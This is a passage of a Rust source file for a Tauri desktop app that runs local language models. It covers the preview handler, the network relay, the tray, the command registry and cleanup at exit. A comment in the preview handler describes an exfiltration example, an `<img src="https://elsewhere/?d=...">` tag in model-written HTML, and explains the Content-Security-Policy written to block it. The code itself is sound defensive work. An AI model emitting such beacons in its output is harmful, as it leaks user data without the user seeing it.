        "avif" => "image/avif",
        "ico" => "image/x-icon",
        "woff" => "font/woff",
        "woff2" => "font/woff2",
        "ttf" => "font/ttf",
        "otf" => "font/otf",
        "mp4" => "video/mp4",
        "webm" => "video/webm",
        "mp3" => "audio/mpeg",
        "wav" => "audio/wav",
        "wasm" => "application/wasm",
        "txt" | "md" => "text/plain; charset=utf-8",
        _ => "application/octet-stream",
    }
}

/// Publish HTML for the preview frame and return the URL to point it at. The
/// id changes on every call so the webview reloads instead of serving a
/// cached document; only the latest page is kept.
#[tauri::command]
fn preview_publish(html: String) -> String {
    let mut slot = preview_slot().lock().unwrap_or_else(|e| e.into_inner());
    slot.0 += 1;
    slot.1 = html;
    format!("gxpreview://localhost/p/{}", slot.0)
}

// ---------------------------------------------------------------- entry


// ---------------------------------------------------------------- relay
//
// The engine is never exposed directly. See relay.rs for why: the bundled
// llama-server has no authentication option at all and its CORS default is
// `*`, so binding it outside 127.0.0.1 would publish an open endpoint.

#[tauri::command]
fn relay_status() -> relay::RelayStatus {
    relay::status()
}

/// Mint a new key. Returned ONCE, to be shown once and then stored by the user.
#[tauri::command]
fn relay_new_key() -> Result<String, String> {
    relay::generate_key()
}

/// Start the relay. `bind` is "127.0.0.1" or "0.0.0.0"; anything else is
/// refused in relay.rs rather than attempted.
#[tauri::command]
fn relay_start(bind: String, port: u16, key: String) -> Result<relay::RelayStatus, String> {
    let engine_port = {
        let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        match s.child.is_none() {
            // Zero means "no text model", and the relay answers text requests
            // with a 503 that says which. It is allowed because the image
            // routes are served by this process rather than proxied: a Mac
            // whose job is making pictures for a team should not have to load
            // a language model it will never be asked anything.
            true if image::image_engine_present() => 0,
            true => return Err("start a model before opening the relay".into()),
            false => {
                if s.port == 0 { SERVER_PORT_BASE } else { s.port }
            }
        }
    };
    relay::start(&bind, port, engine_port, &key)?;
    Ok(relay::status())
}

#[tauri::command]
fn relay_stop() -> relay::RelayStatus {
    relay::stop();
    relay::status()
}

/// Addresses this Mac can be reached on, for the connection snippets.
///
/// Reads the interfaces rather than guessing: telling the user to try
/// "your local IP" is how an integration guide becomes useless.
#[tauri::command]
fn relay_addresses() -> Vec<String> {
    let mut out = vec!["127.0.0.1".to_string()];
    if let Ok(o) = Command::new("/usr/sbin/ipconfig").args(["getifaddr", "en0"]).output() {
        let ip = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if !ip.is_empty() {
            out.push(ip);
        }
    }
    if let Ok(o) = Command::new("/usr/sbin/ipconfig").args(["getifaddr", "en1"]).output() {
        let ip = String::from_utf8_lossy(&o.stdout).trim().to_string();
        if !ip.is_empty() && !out.contains(&ip) {
            out.push(ip);
        }
    }
    out
}

// ---------------------------------------------------------------- the tray
//
// Server mode runs unattended work in a window nobody is looking at. The red
// button already hides that window rather than destroying it (see
// on_window_event below), which is the only reason a scheduled job can drive
// an agent at 03:00: the agent loop lives in the webview, and a destroyed
// webview takes it with it.
//
// Hiding a window that is still working is exactly the "invisible but running"
// state that makes people distrust an app, so server mode also puts an item in
// the menu bar. It says the app is there, it brings the window back, and it
// offers the one action that genuinely stops the work: Quit.

const TRAY_ID: &str = "galactus-tray";

fn tray_show(app: &AppHandle) -> Result<(), String> {
    use tauri::menu::{Menu, MenuItem};
    use tauri::tray::TrayIconBuilder;

    if app.tray_by_id(TRAY_ID).is_some() {
        return Ok(());
    }
    let show = MenuItem::with_id(app, "tray-show", "Show Galactus", true, None::<&str>)
        .map_err(|e| e.to_string())?;
    let quit = MenuItem::with_id(
        app,
        "tray-quit",
        "Quit Galactus (stops scheduled jobs)",
        true,
        None::<&str>,
    )
    .map_err(|e| e.to_string())?;
    let menu = Menu::with_items(app, &[&show, &quit]).map_err(|e| e.to_string())?;
    let mut builder = TrayIconBuilder::with_id(TRAY_ID)
        .menu(&menu)
        .tooltip("Galactus, server mode")
        .show_menu_on_left_click(true);
    if let Some(icon) = app.default_window_icon().cloned() {
        builder = builder.icon(icon).icon_as_template(true);
    }
    builder
        .on_menu_event(|app, event| match event.id.as_ref() {
            "tray-show" => {
                if let Some(w) = app.get_webview_window("main") {
                    let _ = w.show();
                    let _ = w.set_focus();
                }
            }
            "tray-quit" => app.exit(0),
            _ => {}
        })
        .build(app)
        .map_err(|e| e.to_string())?;
    Ok(())
}

/// Show or hide the menu bar item. Called by the frontend when the app mode
/// changes, and at startup from the stored mode.
#[tauri::command]
fn tray_set(app: AppHandle, on: bool) -> Result<(), String> {
    if on {
        tray_show(&app)
    } else {
        app.remove_tray_by_id(TRAY_ID);
        Ok(())
    }
}

/// Register the update plugins.
///
/// Split out of `run` because the two plugins are desktop-only and the
/// `cfg` has to sit on a statement rather than in the middle of a builder
/// chain. The updater is registered unconditionally at startup, which is NOT
/// the same thing as checking for an update at startup: registering only
/// installs the commands the frontend may call. Whether a check ever happens,
/// and whether a restart ever follows it, is decided in the frontend, where
/// the app knows if a human is watching (see updateSection in main.ts).
#[cfg(desktop)]
fn with_updates<R: tauri::Runtime>(b: tauri::Builder<R>) -> tauri::Builder<R> {
    b.plugin(tauri_plugin_updater::Builder::new().build())
        .plugin(tauri_plugin_process::init())
}

#[cfg(not(desktop))]
fn with_updates<R: tauri::Runtime>(b: tauri::Builder<R>) -> tauri::Builder<R> {
    b
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    with_updates(tauri::Builder::default())
        .register_uri_scheme_protocol("gxpreview", |_app, request| {
            // TWO things answer on this scheme, and they are not the same shape.
            //
            // /p/<n> is the Chat preview: one self-contained document with no
            // sub-resources, published by preview_publish. Sealed as tightly as
            // it has always been.
            //
            // Anything else is the Code preview: a folder on disk, where
            // index.html asks for styles.css which asks for a font. Those files
            // have to resolve, so this branch serves them, and its policy has to
            // allow the document to load them. It still cannot reach the network:
            // every source below is the preview scheme itself.
            let path = request.uri().path().to_string();
            if !path.starts_with("/p/") {
                let Some(file) = preview_file_for(&path) else {
                    return tauri::http::Response::builder()
                        .status(404)
                        .header("Content-Type", "text/plain; charset=utf-8")
                        .body(b"not found in the preview folder".to_vec())
                        .unwrap_or_else(|_| {
                            tauri::http::Response::builder().status(500).body(Vec::new()).unwrap()
                        });
                };
                let mime = preview_mime(&file);
                let body = std::fs::read(&file).unwrap_or_default();
                let mut builder = tauri::http::Response::builder()
                    .status(200)
                    .header("Content-Type", mime)
                    .header("Cache-Control", "no-store");
                if mime.starts_with("text/html") {
                    // 'self' here means this scheme and this scheme only, which
                    // is the preview folder. The seal that matters is unchanged:
                    // no http, no https, so a page the model wrote cannot carry
                    // anything out, and a CDN it references simply does not load.
                    builder = builder.header(
                        "Content-Security-Policy",
                        "default-src 'none'; \
                         img-src 'self' data: blob:; \
                         style-src 'self' 'unsafe-inline' data:; \
                         script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; \
                         font-src 'self' data:; \
                         media-src 'self' data: blob:; \
                         connect-src 'self'; \
                         form-action 'none'; \
                         base-uri 'none'; \
                         frame-src 'self'; \
                         frame-ancestors 'self'",
                    );
                }
                return builder.body(body).unwrap_or_else(|_| {
                    tauri::http::Response::builder().status(500).body(Vec::new()).unwrap()
                });
            }
            let html = preview_slot()
                .lock()
                .unwrap_or_else(|e| e.into_inner())
                .1
                .clone();
            tauri::http::Response::builder()
                .status(200)
                .header("Content-Type", "text/html; charset=utf-8")
                // The preview's own policy. It used to be `default-src *`,
                // which made this a FOURTH way out to the network, and the
                // only one with no dialog, no URL shown and no tool card: a
                // model that answered with an html block carrying
                // `<img src="https://elsewhere/?d=...">` exfiltrated on a
                // single click of the preview button, while the README
                // promised every exit was announced.
                //
                // The preview is now sealed. Everything it renders must be in
                // the document: inline styles and scripts still work, data and
                // blob URLs still work, so a self-contained page previews
                // exactly as before. What no longer works is reaching out, and
                // that is the entire point. `frame-ancestors 'self'` keeps the
                // page from re-embedding the app; `form-action 'none'` closes
                // the submit route out, which default-src does not cover.
                .header(
                    "Content-Security-Policy",
                    "default-src 'none'; \
                     img-src data: blob:; \
                     style-src 'unsafe-inline' data:; \
                     script-src 'unsafe-inline' 'unsafe-eval' data: blob:; \
                     font-src data:; \
                     media-src data: blob:; \
                     connect-src 'none'; \
                     form-action 'none'; \
                     base-uri 'none'; \
                     frame-ancestors 'self'",
                )
                .header("Cache-Control", "no-store")
                .body(html.into_bytes())
                .unwrap_or_else(|_| {
                    tauri::http::Response::builder().status(500).body(Vec::new()).unwrap()
                })
        })
        .setup(|app| {
            let _ = app.get_webview_window("main");
            // The relay serves pictures itself (imgapi.rs) and has no handle of
            // its own; with this, a generation asked for over the network shows
            // in the window like any other.
            relay::set_app(app.handle().clone());
            if let Err(e) = harden_settings_permissions() {
                eprintln!("Galactus settings permission hardening failed: {e}");
            }
            crate::library::seed_bundled_skills();
            if let Err(e) = crate::library::seed_bundled_vault() {
                eprintln!("Galactus vault seeding failed: {e}");
            }
            // The clock starts with the process and not with the view: a
            // schedule that only ticked while the Runs screen was open would
            // be a schedule that stops when someone switches to Settings.
            // The clock is started by the frontend, once it is listening. See
            // scheduler::jobs_ready.
            // Take back what earlier sessions left behind. Off the main thread
            // and silent: a machine that cannot delete a temporary file must
            // still start, and this is not news the user asked for.
            std::thread::spawn(|| {
                let swept = housekeeping::sweep_all(&app_support());
                if swept.files > 0 {
                    eprintln!(
                        "galactus: housekeeping removed {} files ({:.1} MB)",
                        swept.files,
                        swept.bytes as f64 / 1e6
                    );
                }
            });
            if settings_load().get("app_mode").map(|m| m == "server").unwrap_or(false) {
                if let Err(e) = tray_show(app.handle()) {
                    eprintln!("Galactus tray failed: {e}");
                }
            }
            Ok(())
        })
        .on_window_event(|window, event| {
            // macOS convention: the red button hides the window, the app
            // lives on in the Dock; ⌘Q is the one that really quits (and
            // takes the engine down through RunEvent::Exit below).
            if let tauri::WindowEvent::CloseRequested { api, .. } = event {
                let _ = window.hide();
                api.prevent_close();
            }
        })
        .invoke_handler(tauri::generate_handler![
            hw_info,
            load_registry,
            server_status,
            server_start,
            server_stop,
            engine_diagnose,
            install::install_model,
            install::cancel_install,
            install::delete_model,
            list_volumes,
            volume_bandwidth,
            recommend_for_model,
            tools::tool_fs_read,
            tools::tool_web_fetch,
            tools::scratch_write,
            tools::tool_fs_write,
            tools::tool_fs_preview,
            tools::tool_fs_revert,
            tools::tool_fs_list,
            tools::tool_shell_run,
            notify,
            server_log,
            server_metrics,
            settings_get,
            release_notes,
            settings_set,
            mcp_config_set,
            root_set,
            mcp_reload,
            mcp_tools,
            mcp_call,
            detect_root,
            pick_folder,
            pick_image,
            pick_audio,
            library::memory_read,
            library::memory_write,
            library::memory_save,
            library::memory_append,
            library::obsidian_search,
            library::obsidian_read,
            library::obsidian_append,
            library::obsidian_graph,
            library::obsidian_write,
            library::obsidian_resolve,
            library::obsidian_create_vault,
            library::skills_list,
            library::skill_read,
            library::learned_list,
            library::learned_write,
            library::learned_delete,
            library::learned_folder,
            conversations::conv_list,
            conversations::conv_load,
            conversations::conv_save,
            conversations::conv_delete,
            conversations::conv_search,
            conversations::conv_read,
            documents::doc_read,
            documents::doc_edit,
            documents::doc_capabilities,
            voice_start,
            voice_stop,
            tts_speak,
            tts_stop,
            knowledge::kb_folders,
            knowledge::kb_set_folders,
            knowledge::kb_reindex,
            knowledge::kb_stats,
            code::code_tree,
            code::code_read,
            code::code_write,
            code::code_stamp,
            code::git_info,
            code::git_status,
            code::git_log,
            code::git_diff,
            code::git_file_diff,
            code::git_show_file,
            code::git_stage,
            code::git_commit,
            code::git_clone,
            image::image_models,
            image::image_engine_present,
            image::image_install,
            image::image_generate,
            image::image_cancel,
            image::image_install_cancel,
            image::image_gallery,
            image::image_read,
            image::image_forget,
            image::image_export,
            code::code_create,
            code::code_rename,
            code::code_delete,
            ssh::ssh_hosts,
            ssh::ssh_host_save,
            ssh::ssh_host_remove,
            ssh::ssh_spawn,
            secaudit::sec_scan_ports,
            secaudit::sec_audit_web,
            code::git_push,
            code::git_pull,
            code::git_branches,
            code::git_checkout,
            // Workspace engine: enumeration, project search, symbol index.
            // The toolchain probe is NOT exposed as a command: git availability
            // reaches the front end through GitInfo.available, and nothing in
            // the app acts on node, cargo or make.
            search::search_start,
            search::search_cancel,
            search::search_files,
            symbols::symbols_index,
            symbols::symbols_query,
            // Tier A: the bulk snapshot the in-app TypeScript service reads.
            snapshot::code_snapshot,
            // Tier B, Python: exact SyntaxError and outline from bundled CPython.
            pylang::py_analyze,
            rust_analyzer_paths,
            // Tier A for .rs: the bundled rust-analyzer over LSP. The command
            // surface is deliberately thin, and lsp.rs refuses any method that
            // is not read-only (no executeCommand, no formatting: both would
            // run the project's own toolchain).
            lsp::rust_lsp_start,
            lsp::rust_lsp_stop,
            lsp::rust_lsp_status,
            lsp::rust_lsp_request,
            lsp::rust_lsp_notify,
            // Integrated terminal: one real pty per session. Not exposed to
            // the model as a tool. A model driven write still has to pass the
            // `shell` gate in code/terminal.ts, and pty.rs refuses one that
            // does not say it did.
            pty::pty_spawn,
            pty::pty_write,
            pty::pty_resize,
            pty::pty_kill,
            pty::pty_list,
            knowledge::kb_search,
            knowledge::digest_search,
            relay_status,
            relay_new_key,
            relay_start,
            relay_stop,
            relay_addresses,
            // Scheduled jobs. Rust owns the clock, the definitions and the
            // catch-up decision; the frontend owns the agent loop and reports
            // back through jobs_report. See scheduler.rs.
            scheduler::jobs_list,
            scheduler::jobs_ready,
            scheduler::jobs_save,
            scheduler::jobs_delete,
            scheduler::jobs_enable,
            scheduler::jobs_run_now,
            scheduler::jobs_report,
            scheduler::jobs_preview,
            tray_set,
            preview_publish,
            preview_set_root
        ])
        .build(tauri::generate_context!())
        .expect("error while running Galactus")
        .run(|app, event| {
            // Dock click with the window closed must bring it back (macOS
            // keeps the process alive after the red button).
            if let tauri::RunEvent::Reopen { .. } = event {
                if let Some(w) = app.get_webview_window("main") {
                    let _ = w.show();
                    let _ = w.set_focus();
                }
            }
            // The window closing must take the engine with it: an abandoned
            // llama-server keeps tens of GB of RAM pinned, and every MCP
            // server would linger as an orphan.
            if let tauri::RunEvent::Exit = event {
                // A workspace scan is a plain OS thread: tell it to stop before
                // the window goes, or it outlives the app it was painting into.
                search::cancel_all();
                // An abandoned rust-analyzer keeps a whole crate index in RAM
                // and nothing on screen says so.
                lsp::shutdown_all();
                // Every terminal is a shell with a process group under it: an
                // abandoned `npm run dev` keeps holding its port long after
                // the window is gone.
                pty::kill_all();
                // The relay listens on a socket that must not outlive the window.
                relay::stop();
                if let Ok(mut s) = server_state().lock() {
                    if let Some(mut child) = s.child.take() {
                        let _ = child.kill();
                        let _ = child.wait();
                    }
                    s.phase = "stopped".into();
                    s.port = 0;
                }
                // By pid, not through the server locks: a connector may be
                // mid-call and holding its own lock for another minute, and the
                // window must close now. The process group is left to the system
                // to reap, which it does as soon as this process exits.
                mcp_kill_children();
                // An install in flight is curl downloading up to two hundred
                // gigabytes and a Python packer writing tens more. Neither was
                // touched at exit: they were reparented and carried on filling
                // the disk with no window and no icon to stop them.
                if let Ok(map) = crate::install::install_cancels().lock() {
                    for flag in map.values() {
                        flag.store(true, Ordering::SeqCst);
                    }
                }
                // The flag alone was the bug: nobody is left to read it. The
                // children are killed by pid, here, before this process goes.
                crate::install::kill_install_children();
                // Same reason: a generation holds ten gigabytes and a download
                // keeps writing seven more after the window has gone.
                image::kill_child();
                // Voice capture and speech must not outlive the app either.
                if let Ok(mut v) = voice_state().lock() {
                    if let Some(mut c) = v.child.take() {
                        let _ = c.kill();
                        let _ = c.wait();
                    }
                }
                if let Some(t) = TTS.get() {
                    if let Ok(mut slot) = t.lock() {
                        if let Some(mut c) = slot.take() {
                            let _ = c.kill();
                            let _ = c.wait();
                        }
                    }
                }
            }
        });
}





#[cfg(test)]
mod registry_context_tests {
    /// Every context window in the shipped registry, and why it has to be right.
    ///
    /// Both directions cost something. Too HIGH and llama.cpp extends the rope
    /// past what the model was trained on, and the answers quietly get worse.
    /// Too LOW and the user is refused a window the model has: the two 2507
    /// entries carried 40960, which is the figure from the release BEFORE them,
    /// so a 256K model was served a sixth of what it holds, and Qwen3.6 carried
    /// none at all, which falls back to a cautious 32768.
    ///
    /// Checked against the config.json each model publishes, not against
    /// memory. A missing entry is allowed and means the cautious ceiling: that
    /// is the honest answer for Llama-4 Scout, whose repository is gated and
    /// whose figure could not be read.
    #[test]
    fn the_declared_context_matches_what_the_model_publishes() {
        let raw = include_str!("../packaged/scripts/models-registry.json");
        let v: serde_json::Value = serde_json::from_str(raw).expect("registry parses");
        let models = v["models"].as_array().expect("models is an array");

        // id -> max_position_embeddings, read from each model's own config.json
        // on 2026-08-19. text_config.max_position_embeddings for the
        // multimodal ones, which nest it.
        let published: &[(&str, u64)] = &[
            ("qwen3-30b-a3b", 262_144),
            ("qwen3-235b-a22b", 262_144),
            ("qwen35-35b-a3b", 262_144),
            ("mellum2-12b", 131_072),
            ("olmoe-1b-7b", 4_096),
            // Meta's announced 10M, and the exact figure is 10 * 1024 * 1024.
            // meta-llama's own repository is gated, so this was read from
            // unsloth's mirror, which is the repository this entry actually
            // downloads from: the number that matters here is the one shipped
            // beside the weights we serve.
            //
            // Worth knowing what that 10M is made of: the config declares
            // rope_scaling llama3 with original_max_position_embeddings 8192.
            // The window is reached by extension, not by training at it. That
            // does not change what belongs in this field, which is what the
            // model publishes, and the settings offer stops at 128K anyway.
            ("llama4-scout", 10_485_760),
        ];

        for (id, want) in published {
            let entry = models
                .iter()
                .find(|m| m["id"].as_str() == Some(id))
                .unwrap_or_else(|| panic!("{id} is not in the registry"));
            assert_eq!(
                entry["context_length"].as_u64(),
                Some(*want),
                "{id} declares a window its published config does not"
            );
        }

        // And nothing may declare a window as a string, or as zero, which
        // parses to a ceiling of zero and would serve nothing at all.
        for m in models {
            let id = m["id"].as_str().unwrap_or("?");
            if let Some(c) = m.get("context_length") {
                let n = c.as_u64().unwrap_or_else(|| panic!("{id}: context_length is not a number"));
                assert!(n >= 2048, "{id}: a window of {n} cannot hold a conversation");
            }
        }
    }
}
